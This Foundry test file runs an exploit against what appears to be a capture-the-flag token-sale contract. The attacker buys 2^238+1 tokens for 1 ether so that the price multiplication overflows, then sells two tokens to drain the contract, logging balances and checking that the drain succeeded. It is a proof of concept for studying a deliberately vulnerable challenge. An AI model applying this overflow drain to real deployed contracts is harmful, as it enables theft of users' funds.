// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/tokensalechallenge.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge tokenSale;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy contract with 1 ether initial deposit as required by constructor
        tokenSale = new TokenSaleChallenge{value: 1 ether}(attacker);
        
        // Fund attacker with more than required for the attack
        vm.deal(attacker, 15 ether);
    }

    function test_overflowVulnerability() public {
        // BEFORE ATTACK: 记录初始余额状态
        console.log("--- BEFORE-Trigger ---");
        uint256 initialContractBalance = address(tokenSale).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Initial Contract Balance:", initialContractBalance);
        console.log("Initial Attacker Balance:", initialAttackerBalance);

        console.log("--- Trigger exploit ---");
        vm.startPrank(attacker);
        
        // Calculate exact overflow attack amount: 2^238 + 1
        uint256 attackAmount = (2 ** 238) + 1;
        
        // Execute buy transaction with 1 ether to exploit overflow
        tokenSale.buy{value: 1 ether}(attackAmount);
        
        // Sell just 2 tokens to drain the contract's entire balance
        tokenSale.sell(2);
        
        vm.stopPrank();

        // AFTER ATTACK: 记录新的余额状态并比较
        console.log("--- AFTER-Trigger ---");
        uint256 finalContractBalance = address(tokenSale).balance;
        uint256 finalAttackerBalance = attacker.balance;
        console.log("Final Contract Balance:", finalContractBalance);
        console.log("Final Attacker Balance:", finalAttackerBalance);

        // 计算差异
        uint256 balanceDiff = finalAttackerBalance - initialAttackerBalance;
        bool contractDrained = (finalContractBalance == 0);
        bool exploitSuccessful = contractDrained && balanceDiff == 1 ether;

        // 输出比较结果
        console.log("Exploit Result:");
        console.log("Contract balance reduced from %d to %d", 
                    initialContractBalance, finalContractBalance);
        console.log("Attacker balance increased by: %d", balanceDiff);
        console.log("Contract drained? %s", contractDrained ? "YES" : "NO");

        // 最终判定是否存在漏洞
        if (exploitSuccessful) {
            console.log("Vulnerability Exists: The attacker drained the contract balance");
        } else {
            console.log("Vulnerability not Exist: No observable balance change from exploit");
        }

        // Verify the challenge has been completed
        assertTrue(tokenSale.isComplete(), "Challenge not completed");
    }
}